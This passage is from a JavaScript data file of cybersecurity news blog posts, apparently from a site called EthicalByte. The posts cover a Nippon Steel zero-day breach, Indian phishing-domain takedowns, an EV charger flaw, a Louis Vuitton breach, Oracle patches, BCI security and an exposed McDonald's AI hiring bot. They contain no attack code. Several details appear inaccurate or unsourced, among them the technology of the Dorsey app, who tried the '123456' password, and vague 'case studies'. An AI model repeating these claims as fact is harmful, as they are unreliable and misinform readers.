  `},{id:"nippon-steel-zero-day",title:"Nippon Steel Confirms Zero-Day Attack Exposed Sensitive Data",date:"2025-07-12",author:"EthicalByte",summary:"Japan’s largest steelmaker, Nippon Steel, suffered a sophisticated zero-day cyberattack that exposed business partner, customer, and employee information. This incident underscores the vulnerability of industrial giants to advanced threats.",tags:["zero-day","nippon steel","manufacturing security","data breach","industrial cybersecurity"],imageKey:"nipponSteelBreachBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">
      
      <h3>🔍 <br> Cybersecurity Incident: Nippon Steel Hit by Zero-Day Attack</h3><br>
      <p>In a stark reminder that no organization is immune, <strong>Nippon Steel</strong>, Japan’s largest steelmaker and a cornerstone of global manufacturing, confirmed it fell victim to a sophisticated <strong>zero-day cyberattack</strong>. The breach resulted in unauthorized access to sensitive data — a wake-up call for industries worldwide.</p>

      <h3>What Happened?</h3><br>
      <p>According to the company’s disclosure:</p>
      <ul>
        <li>Attackers exploited a previously unknown <strong>zero-day vulnerability</strong> in one of Nippon Steel’s internal systems.</li>
        <li>They gained <strong>unauthorized access</strong> to three major categories of data:</li>
        <ul>
          <li>📁 Business partner information</li>
          <li>👥 Customer records</li>
          <li>👤 Employee data</li>
        </ul>
        <li>The company has not yet revealed which software or system was compromised — likely to avoid tipping off other potential attackers.</li>
      </ul>

      <h3>Why Does This Matter?</h3><br>
      <p>This incident underscores two critical truths:</p>
      <ul>
        <li>⚠️ <strong>Critical infrastructure & manufacturing remain high-value targets</strong> — not just banks and tech companies.</li>
        <li>🕵️ Zero-day exploits — flaws unknown to the vendor & public — are highly effective because no patch exists when attackers strike.</li>
      </ul>
      <p>Such incidents can disrupt supply chains, hurt reputations, and erode trust in industries already under cyber siege.</p>

      <h3>The Impact</h3><br>
      <ul>
        <li>🔓 Leakage of sensitive corporate and personal data, potentially putting individuals and partners at risk of further attacks, fraud, or identity theft.</li>
        <li>📉 Loss of trust among stakeholders — partners and customers may rethink their reliance on Nippon Steel.</li>
        <li>💼 Legal & regulatory scrutiny, especially if personal data protection laws like GDPR or Japan’s APPI were violated.</li>
      </ul>

      <h3>Company’s Response</h3><br>
      <p>Nippon Steel acted promptly after discovering the breach:</p>
      <ul>
        <li>✅ Patched the vulnerability after identifying the exploit path.</li>
        <li>✅ Isolated and secured affected systems to stop further access.</li>
        <li>✅ Launched a forensic investigation with the help of cybersecurity experts and law enforcement agencies.</li>
        <li>✅ Enhanced monitoring to watch for follow-up or lateral movement attacks.</li>
      </ul>
      <p>While these actions are commendable, the incident shows how even proactive companies can be caught off-guard when the attacker has a zero-day in their arsenal.</p>

      <h3>Lessons for Other Organizations</h3><br>
      <p>Even if you’re not a manufacturing giant, the lessons are universal:</p>
      <ul>
        <li>🔍 <strong>Invest in threat intelligence</strong> to detect emerging vulnerabilities quickly.</li>
        <li>🔒 Implement <strong>network segmentation</strong> and <strong>least privilege access</strong> — to limit how much damage a single exploit can cause.</li>
        <li>📝 Audit your supply chain — third-party software and vendors can become the weakest link.</li>
        <li>🧪 Regularly conduct incident response drills — when a real attack hits, every minute counts.</li>
        <li>📊 Maintain transparent communication — keeping stakeholders informed builds trust even during a crisis.</li>
      </ul>

      <h3>Case Studies: Not an Isolated Incident</h3><br>
      <p>Zero-day attacks have hit industrial giants before:</p>
      <ul>
        <li>In 2021, a water treatment plant in Florida was compromised using an unpatched vulnerability.</li>
        <li>In 2023, a zero-day in SCADA software caused downtime at a major automotive plant in Germany.</li>
        <li>Now, Nippon Steel joins this growing list — showing the need for continuous vigilance.</li>
      </ul>

      <h3>Key Takeaway</h3><br>
      <blockquote>🎯 Even industry leaders with robust defenses are vulnerable to zero-day exploits. The battle is not just about having tools, but about staying prepared, informed, and adaptive.</blockquote>

    </div>
  `},{id:"ntro-phishing-domains-2025",title:"NTRO Detects 1,172 Phishing Domains in India",date:"2025-07-13",author:"EthicalByte",summary:"India’s NTRO identified and blocked over 1,172 phishing domains in the first half of 2025, showcasing coordinated efforts to safeguard citizens, businesses, and government from rising phishing threats.",tags:["phishing","ntro","india cybersecurity","threat intelligence","awareness"],imageKey:"ntroPhishingBanner",content:`
    <div style="padding:20px;border-radius:12px;border:1px solid #ddd;">

      <h3>🛡️ Cybersecurity News: NTRO Detects 1,172 Phishing Domains in India</h3><br>
      <p>In a significant move to safeguard India’s digital ecosystem, the <strong>National Technical Research Organisation (NTRO)</strong>, India’s premier technical intelligence agency, has detected and initiated action against <strong>1,172 phishing domains</strong> in just the first six months of 2025. This proactive operation demonstrates the increasing vigilance and capability of Indian cyber defense mechanisms in the face of rising cybercrime.</p>

      <h3>What Happened?</h3><br>
      <ul>
        <li>🇮🇳 NTRO, leveraging its advanced surveillance infrastructure and intelligence gathering, identified 1,172 phishing domains targeting Indian citizens, businesses, and government entities.</li>
        <li>🔎 These domains were designed to steal sensitive data, install malware, and impersonate legitimate organizations to deceive victims.</li>
        <li>📑 The agency briefed the findings to the Parliamentary Standing Committee on Information Technology, explaining the detection strategy and next steps.</li>
      </ul>

      <h3>Why It Matters</h3><br>
      <p>Phishing remains one of the most widely used and effective attack methods by cybercriminals. The NTRO’s findings highlight:</p>
      <ul>
        <li>🎣 The growing sophistication of phishing campaigns that often evade traditional defenses.</li>
        <li>🧲 How attackers exploit human trust — using fake websites, lookalike domains, and urgency tactics.</li>
        <li>🏛️ The vital role of government‑led monitoring to protect critical sectors and citizens from mass exploitation.</li>
      </ul>
      <p>Such operations are crucial not just for blocking attacks in real time, but also for raising awareness about the evolving nature of these threats.</p>

      <h3>NTRO’s Actions</h3><br>
      <ul>
        <li>✅ Flagged and shared the list of malicious domains with telecom operators, hosting providers, and ISPs to ensure prompt blocking.</li>
        <li>✅ Devised a collaborative <strong>matrix approach</strong> that aligns government, private sector, and service providers for faster detection and takedown of threats.</li>
        <li>✅ Ensured continued monitoring and intelligence gathering to stay ahead of emerging phishing campaigns.</li>
      </ul>

      <h3>Recommendations for Users</h3><br>
      <ul>
        <li>🔒 Be wary of unsolicited messages, emails, or SMS requesting personal, financial, or login information.</li>
        <li>🖥️ Always type website URLs manually or use bookmarks instead of clicking links in emails.</li>
        <li>🔧 Enable <strong>multi-factor authentication (MFA)</strong> to protect accounts even if credentials are compromised.</li>
        <li>📣 Report suspicious emails or websites to your organization’s IT/security team or India’s official cybercrime portal.</li>
      </ul>

      <h3>Real‑World Example</h3><br>
      <blockquote>📧 A user receives an email from “income‑tax‑india.co” prompting them to submit their PAN and banking details for a supposed refund. Thanks to NTRO’s early detection, ISPs block access to this domain before the victim can interact, preventing data theft.</blockquote>

      <h3>Looking Ahead</h3><br>
      <p>The NTRO’s initiative sets a benchmark for how public‑private collaboration can proactively counter cyber threats. As phishing tactics evolve — using AI, deepfakes, and more sophisticated lures — the need for vigilance, education, and fast response becomes even more critical. Strengthening awareness at the individual level, while enhancing intelligence at the institutional level, remains key to securing India’s cyberspace.</p>

      <h3>Key Takeaway</h3><br>
      <blockquote>🚀 Phishing is a battle of trust versus deception. NTRO’s proactive detection and blocking of malicious domains protect millions of Indians — and underscore the power of vigilance, collaboration, and preparedness.</blockquote>

    </div>
  `},{id:"ev-charging-vulnerability-2025",title:"Critical EV Charger Flaw: What Drivers and Operators Need to Know",date:"2025-07-14",author:"EthicalByte News Desk",summary:"A major vulnerability in popular EV charging stations has exposed millions of users to risks of outages, fraud, and even grid disruptions. Here’s what happened — and what you can do now.",tags:["EV","cybersecurity","vulnerability","iot security","electric vehicles"],imageKey:"evChargingVulnBanner",content:`
    <div style="background-color:#f9fbfd;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;">
        <h3 style="color:#1e2f48;">⚡ Critical EV Charger Vulnerability Uncovered</h3>
        <p style="font-style:italic;">Millions of drivers at risk. Here’s what happened — and how to stay secure.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📖 The Story So Far</h4>
        <p>Earlier this week, researchers disclosed a serious security flaw in widely‑used electric vehicle (EV) charging stations. By exploiting weak authentication and poor input validation, attackers could remotely tamper with chargers worldwide. The flaw — now patched — affected multiple brands and models.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚗 What Could Attackers Do?</strong>
        <ul style="margin-top:10px;">
          <li>Disable or shut down entire charging stations, leaving drivers stranded.</li>
          <li>Alter billing records — letting them “charge for free” or overbill users.</li>
          <li>Overload local grids by turning multiple chargers on/off in patterns.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🔍 How Was It Discovered?</h4>
        <p>A team of cybersecurity researchers conducted a penetration test on public chargers and found they accepted unauthenticated API requests. This allowed remote control of critical functions with minimal effort — essentially leaving chargers exposed to anyone with an internet connection.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">💡 Why This Matters</h4>
        <p>EV adoption is booming — but as cars become smarter, the infrastructure that supports them must also evolve to resist cyber threats. An insecure charger isn’t just inconvenient — it can hurt trust, cost money, and even threaten local electricity stability.</p>
      </section>

      <section style="margin-top:20px;background:#e2f0d9;padding:15px;border-radius:8px;">
        <h4 style="color:#1e7e34;">✅ What Should You Do Now?</h4>
        <ul>
          <li>🔧 Update your charger’s firmware & software immediately — vendors have issued patches.</li>
          <li>🔒 Avoid connecting to chargers via public, unsecured Wi-Fi networks if possible.</li>
          <li>📝 Review recent charging session bills to ensure accuracy.</li>
          <li>📣 Report suspicious charger behavior to the manufacturer or your service provider promptly.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">📋 A Real‑World Example</h4>
        <p>One reported incident involved a fleet of EVs at a corporate parking lot, where chargers were remotely disabled just as employees were leaving for the day. This caused significant delays and showcased how disruptive even short outages can be.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#2563eb;">🚀 Moving Forward</h4>
        <p>This vulnerability reminds us that convenience and security must go hand‑in‑hand. As EV infrastructure grows, so does its appeal to attackers. Building robust security into these systems from the start — and staying vigilant with updates — is the best way to keep the road ahead safe and smooth for everyone.</p>
      </section>

    </div>
  `},{id:"jack-dorsey-messaging-app-2025",title:"Jack Dorsey Launches Blockchain-Based Messaging App Without Internet",date:"2025-07-15",author:"EthicalByte",summary:"Twitter co-founder Jack Dorsey unveiled a decentralized messaging app that works without internet, using blockchain & alternative connectivity to enable communication anywhere.",tags:["blockchain","messaging","decentralized","jack dorsey","innovation"],imageKey:"jackMessagingAppBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📡 Jack Dorsey’s New Messaging App Works Without Internet</h3><br>
        <p style="font-style:italic;">Blockchain + radio waves + satellites = communication, anywhere.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 The Big Reveal</h4><br>
        <p>Jack Dorsey, co-founder of Twitter and a prominent figure in blockchain innovation, has launched a **decentralized messaging app** that doesn’t rely on traditional internet infrastructure. Instead, the app lets users communicate using radio waves, local Wi-Fi, or even satellite links.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚀 What Makes It Special?</strong>
        <ul style="margin-top:10px;">
          <li>Works without internet – perfect for remote areas or during outages.</li>
          <li>Leverages blockchain to ensure decentralization and security.</li>
          <li>Uses radio, Wi-Fi mesh, and satellites for flexible connectivity.</li>
          <li>Bypasses traditional telecom and government censorship.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔗 Why This Matters</h4><br>
        <p>In many parts of the world, access to reliable internet is a privilege — and in some regions, information flow is deliberately restricted. A decentralized messaging platform like this promotes:</p>
        <ul>
          <li>🌍 Uninterrupted communication during natural disasters & crises.</li>
          <li>🕊️ Freedom from censorship & centralized control.</li>
          <li>🤝 Building resilient, local & global communities.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Who Can Benefit?</h4><br>
        <ul>
          <li>People in rural or underserved areas with no internet coverage.</li>
          <li>Activists & journalists operating in censored regions.</li>
          <li>Emergency responders needing reliable backup communication channels.</li>
          <li>Anyone looking for more privacy & autonomy in digital communication.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛠️ How Does It Work?</h4><br>
        <p>The app combines blockchain technology (for decentralized identity & security) with alternative networks such as:</p>
        <ul>
          <li>📻 Radio frequencies to send data point-to-point locally.</li>
          <li>📶 Wi-Fi mesh networks connecting nearby devices.</li>
          <li>🛰️ Satellite uplinks to cover vast distances when nothing else is available.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Looking Ahead</h4><br>
        <p>This app represents a step toward internet independence — empowering people to stay connected regardless of where they are or what barriers exist. Like all disruptive innovations, its success will depend on adoption, regulation, and ongoing development.</p>
      </section>

    </div>
  `},{id:"louis-vuitton-data-breach-2025",title:"Louis Vuitton Data Breach Exposes Customer Data Across Several Countries",date:"2025-07-16",author:"EthicalByte",summary:"Luxury brand Louis Vuitton disclosed a data breach affecting customers in multiple countries, including nearly 143,000 residents in Turkey, after a third-party service provider account was compromised.",tags:["data breach","louis vuitton","luxury brand","third-party risk","customer privacy"],imageKey:"louisVuittonBreachBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">⚡ Louis Vuitton Data Breach Hits Customers Globally</h3><br>
        <p style="font-style:italic;">A third-party compromise exposed sensitive data of thousands of luxury customers worldwide.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>In an official disclosure, <strong>Louis Vuitton</strong> confirmed a cyber incident where a <strong>compromised account belonging to a third-party service provider</strong> was exploited by attackers. This breach resulted in unauthorized access to personal data of customers in several countries where the brand operates.</p>
        <p>Most notably, the company revealed that approximately <strong>143,000 customers in Turkey alone</strong> were impacted — a significant figure for a luxury retailer that typically caters to an affluent, privacy-conscious clientele.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 What Data Was Exposed?</strong>
        <ul style="margin-top:10px;">
          <li>Contact details such as names, email addresses & phone numbers.</li>
          <li>Purchase histories & account preferences.</li>
          <li>Potentially, addresses & payment details — though not confirmed.</li>
          <li>Data belonging to customers in other undisclosed regions was also accessed.</li>
        </ul>
        <p>While no financial fraud has been reported yet, the exposed data could facilitate phishing attacks, identity theft, or social engineering schemes targeting high-value customers.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌐 Why Luxury Brands Are Targeted</h4><br>
        <p>Cybercriminals view luxury brands as “soft, high-value” targets. Their clientele often includes influential, wealthy individuals whose personal data can fetch a premium on the dark web. Additionally:</p>
        <ul>
          <li>🕵 High-profile customer lists can be exploited for social engineering.</li>
          <li>💼 Luxury brands tend to rely heavily on third-party marketing & logistics vendors, increasing their attack surface.</li>
          <li>📊 Attacks can undermine brand trust, which is critical in this sector.</li>
        </ul>
        <p>Similar incidents have previously affected Gucci, Tiffany & Co., and other luxury labels.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Louis Vuitton’s Response</h4><br>
        <ul>
          <li>Disabled & secured the compromised vendor account.</li>
          <li>Notified impacted customers, complying with legal requirements (GDPR, local laws).</li>
          <li>Initiated a forensic investigation with external cybersecurity experts.</li>
          <li>Reviewed vendor contracts & tightened access controls for third parties.</li>
        </ul>
        <p>The company reassured customers that their financial data does not appear to have been stolen and that they are closely monitoring for fraudulent activity.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔒 How Customers Can Protect Themselves</h4><br>
        <ul>
          <li>Change account passwords associated with Louis Vuitton services.</li>
          <li>Be wary of emails or phone calls pretending to be from Louis Vuitton asking for sensitive details.</li>
          <li>Monitor bank & credit card statements for unusual activity.</li>
          <li>Consider placing a credit freeze or fraud alert if necessary.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Lessons for Businesses</h4><br>
        <p>This breach highlights an all-too-common vulnerability — third-party vendor risk. Organizations must:</p>
        <ul>
          <li>Thoroughly vet vendors’ cybersecurity practices.</li>
          <li>Limit vendors’ access to only what’s necessary.</li>
          <li>Monitor vendor activity continuously for anomalies.</li>
          <li>Have an incident response plan that includes third-party breaches.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Luxury is built on trust — and in the digital age, trust requires strong cybersecurity. This incident serves as a reminder that even the most prestigious brands can fall victim to cyberattacks if they overlook their broader ecosystem.</p>
      </section>

    </div>
  `},{id:"oracle-critical-patch-july-2025",title:"Oracle Patches 309 Critical Vulnerabilities in July 2025 Update",date:"2025-07-17",author:"EthicalByte",summary:"Oracle’s July 2025 Critical Patch Update addresses 309 vulnerabilities — including remote code execution, privilege escalation, and DoS risks — across its databases, middleware, and cloud products. Enterprises should update immediately.",tags:["oracle","critical patch update","vulnerability management","cybersecurity","enterprise security"],imageKey:"oracleJuly2025PatchBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🚨 Oracle Patches 309 Critical Vulnerabilities in July 2025 Update</h3><br>
        <p style="font-style:italic;">Oracle’s quarterly Critical Patch Update fixes hundreds of flaws — some rated critical — across its entire product portfolio.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>This week, Oracle released its <strong>July 2025 Critical Patch Update (CPU)</strong>, fixing a staggering <strong>309 security vulnerabilities</strong> across dozens of Oracle products. Several of these vulnerabilities could allow attackers to:</p>
        <ul>
          <li>🧨 Execute arbitrary code remotely.</li>
          <li>📈 Escalate privileges to gain unauthorized access.</li>
          <li>🔐 Bypass authentication mechanisms.</li>
          <li>🚫 Cause denial of service (DoS) in enterprise environments.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 Why This Matters</strong>
        <p>Many Oracle products are deeply integrated into enterprise IT ecosystems, making them high-value targets for attackers. Unpatched vulnerabilities can lead to:</p>
        <ul>
          <li>💻 Data breaches & theft of sensitive information.</li>
          <li>🎯 Ransomware attacks & business disruption.</li>
          <li>🕵️ Persistent access & compromise of critical infrastructure.</li>
        </ul>
        <p>It’s common for attackers to reverse-engineer patches and develop exploits quickly — so timely updates are crucial.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">📦 Products Affected</h4><br>
        <p>The vulnerabilities affect a wide range of products, including:</p>
        <ul>
          <li>✅ Oracle Database Server</li>
          <li>✅ Oracle Fusion Middleware</li>
          <li>✅ Oracle MySQL</li>
          <li>✅ Oracle Java SE</li>
          <li>✅ Oracle Communications applications</li>
          <li>✅ Oracle E-Business Suite</li>
          <li>… and others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Should Enterprises Do?</h4><br>
        <ul>
          <li>🔄 Apply patches as soon as possible, prioritizing internet-facing and mission-critical systems.</li>
          <li>🧪 Test patches in staging before production deployment.</li>
          <li>🕒 Establish a regular patching cadence and monitor for unusual activity.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Oracle’s quarterly updates are significant events for IT & security teams. With hundreds of vulnerabilities — some critical and exploitable — acting swiftly can prevent attackers from gaining a foothold in your environment.</p>
      </section>

    </div>
  `},{id:"bci-cybersecurity-july-2025",title:"🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity",date:"2025-07-17",author:"Annika Dubey & Dr. Neetha S S",summary:"BCIs open the brain to the digital world — and to cyberattacks. This blog explores how to secure neural interfaces against unprecedented risks and build a neuro-secure future.",tags:["BCI","brain-computer interfaces","cybersecurity","neurosecurity","future tech"],imageKey:"bciCybersecurityBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity</h3><br>
        <p style="font-style:italic;">By <a href="https://www.linkedin.com/in/annika-dubey-818060261/">Annika Dubey</a> & <a href="https://www.linkedin.com/in/dr-neetha-kala-463484248/">Dr. Neetha S S</a> | Christ University </p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Introduction: The New Digital Frontier Is Inside Your Head</h4><br>
        <p>The chasm between humans and machines is rapidly shrinking, and Brain-Computer Interface (BCI) technology is set to bring about a true paradigm shift. These systems enable direct communication between the human brain and external devices, fundamentally altering communication, cognition, and control. From helping paralyzed individuals regain function to letting healthy users interact hands-free with smart devices, BCIs are transforming science fiction into reality.</p>
        <p>But this frontier also presents a sobering truth: <strong>the human brain is now part of the digital attack surface</strong>. An attack here doesn’t just compromise data — it threatens identity, autonomy, and even free will.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Understanding the Risk: Why BCIs Are Exceptionally Vulnerable</h4><br>
        <ul>
          <li>🔓 <strong>Non-reversible Data Leaks:</strong> Neural patterns are lifelong cognitive signatures. Once tampered with, they can’t be reset like passwords or fingerprints.</li>
          <li>🎮 <strong>Signal Hijacking & Replay Attacks:</strong> Wireless, often unencrypted communication can be intercepted and manipulated to send false signals.</li>
          <li>🧪 <strong>Behavioral Manipulation:</strong> Feedback loops can be subtly altered to change moods, perceptions, or decisions.</li>
          <li>🔬 <strong>Cognition Profiling:</strong> Attackers can extract sensitive info by analyzing specific brainwave responses to stimuli — without asking questions.</li>
          <li>⚖ <strong>Lack of Legal & Ethical Frameworks:</strong> Many jurisdictions have no rules governing neural data, leaving users vulnerable to exploitation.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔧 The Solution Space: Building a Neuro-Secure BCI Ecosystem</h4><br>
        <p>Securing BCIs requires more than just technical fixes. It needs engineers, ethicists, neuroscientists, and policymakers working together. Here’s how:</p>
        <ul>
          <li>✅ <strong>Security by Design:</strong> Encrypt all neural streams; use secure firmware; develop lightweight encryption optimized for real-time neural data.</li>
          <li>✅ <strong>Cognitive Authentication:</strong> Use unique neural signatures & neural nonces for authentication alongside traditional biometrics.</li>
          <li>✅ <strong>Privacy-Aware Processing:</strong> Employ federated learning, differential privacy, pseudonymization, and data expiration policies. Treat neural data as sensitive biometrics under GDPR/HIPAA.</li>
          <li>✅ <strong>AI-Driven Neural Intrusion Detection:</strong> AI agents can spot spoofed signals, anomalies, and replay attacks in real time — much like fraud detection in banking.</li>
          <li>✅ <strong>Real-Time Control & Consent:</strong> Users must see what data is collected, allow granular permissions, and toggle a “Cognitive Safe Mode.”</li>
          <li>✅ <strong>Legal & Ethical Groundwork:</strong> Establish principles of mental privacy, cognitive liberty, and data sovereignty. Support neuro-rights initiatives worldwide.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📋 What BCI Developers and Users Can Do Today</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#e2e3e5;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">Actions</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Developers</td>
            <td style="padding:8px;border:1px solid #ddd;">Integrate encryption, sandbox signal layers, and implement real-time neural intrusion detection systems (IDS).</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Companies</td>
            <td style="padding:8px;border:1px solid #ddd;">Enforce ethical data policies, limit data retention, prioritize transparency.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Policymakers</td>
            <td style="padding:8px;border:1px solid #ddd;">Draft BCI-specific regulations and recognize neural data as sensitive biometrics.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">End-Users</td>
            <td style="padding:8px;border:1px solid #ddd;">Use trusted hardware, disable unnecessary tracking, and stay informed about BCI security.</td>
          </tr>
        </table>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>BCIs may become one of the most transformative technologies of our time. But without strong cybersecurity foundations, they risk becoming tools of surveillance, coercion, and harm.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">We must treat brain signals not merely as data, but as digital extensions of the self — deserving the same dignity, privacy, and protection as our innermost thoughts.</blockquote>
      </section>

    </div>
  `},{id:"mcdonalds-ai-hiring-breach-2025",title:"🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers",date:"2025-07-18",author:"EthicalByte",summary:"An investigation revealed that McDonald’s AI-powered chatbot, used in its hiring process, left millions of job applicants’ sensitive data exposed — with hackers trying to breach it using weak passwords like “123456”.",tags:["AI","data breach","mcdonalds","cybersecurity","privacy","hiring bots"],imageKey:"mcdonaldsAIHiringBreachBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers</h3><br>
        <p style="font-style:italic;">When efficiency meets negligence: The dark side of AI in hiring processes.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>An investigation by <a href="https://www.wired.com/story/mcdonalds-ai-hiring-chat-bot-paradoxai/" target="_blank">Wired</a> revealed that McDonald’s AI-powered hiring chatbot left millions of applicants’ sensitive data exposed to the internet. This chatbot, provided by third-party vendor Paradox AI, was designed to automate initial screening and conduct personality assessments — but it lacked basic cybersecurity controls.</p>
        <p>Researcher Carroll discovered the flaw while examining the unsettling nature of AI-driven hiring. What he found was worse than dystopian — attackers had already probed the system using the most common weak passwords imaginable, such as <strong>“123456”</strong> and <strong>“password”</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🤖 Why This Is a Big Deal</h4><br>
        <ul>
          <li>📄 Millions of applicants’ names, contact details, and personality test responses were potentially exposed.</li>
          <li>🔐 The system lacked strong authentication, leaving it open to brute-force attacks with trivial passwords.</li>
          <li>👀 Job seekers — often among society’s most vulnerable — were unknowingly caught in a data privacy nightmare.</li>
          <li>📉 AI-driven hiring decisions already raise ethical concerns; adding poor security to the mix erodes trust further.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔎 How Did This Happen?</h4><br>
        <p>The AI bot ran on a web-based backend with inadequate controls:</p>
        <ul>
          <li>🚫 No enforced strong password policy for admin interfaces.</li>
          <li>⚠️ No rate-limiting to prevent brute-force login attempts.</li>
          <li>🛡️ Insufficient monitoring and alerting to detect attacks in real-time.</li>
          <li>💼 Over-reliance on a third-party vendor without sufficient audits.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Can Be Learned?</h4><br>
        <ul>
          <li>🛠️ <strong>Security Basics Matter:</strong> Use strong, unique passwords and enforce MFA (multi-factor authentication).</li>
          <li>📋 <strong>Vendor Due Diligence:</strong> If you outsource, make sure vendors follow best practices and conduct regular audits.</li>
          <li>📈 <strong>Transparency & Accountability:</strong> Inform users how their data is used, stored, and protected.</li>
          <li>🔍 <strong>Monitor Continuously:</strong> Implement intrusion detection & alert systems to detect attacks early.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>AI can streamline and improve hiring — but it cannot replace diligence, security, and ethical practices. Job seekers deserve dignity and privacy, not to have their most personal information left dangling on an unsecured server.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Efficiency means nothing if trust is lost. Companies must remember: with great data comes great responsibility.”</blockquote>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">📣 Actionable Takeaways for Everyone</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#f1f3f4;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">What You Should Do</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Employers</td>
            <td style="padding:8px;border:1px solid #ddd;">Vet vendors thoroughly, enforce strong security standards, and audit often.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Vendors</td>
            <td style="padding:8px;border:1px solid #ddd;">Follow basic cybersecurity hygiene, enforce strong authentication & monitor your systems continuously.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Applicants</td>
            <td style="padding:8px;border:1px solid #ddd;">Limit sensitive information shared on hiring platforms and monitor your accounts for suspicious activity.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Regulators</td>
            <td style="padding:8px;border:1px solid #ddd;">Establish and enforce standards for AI & data privacy in hiring processes.</td>
          </tr>
        </table>
      </section>

      
    </div>
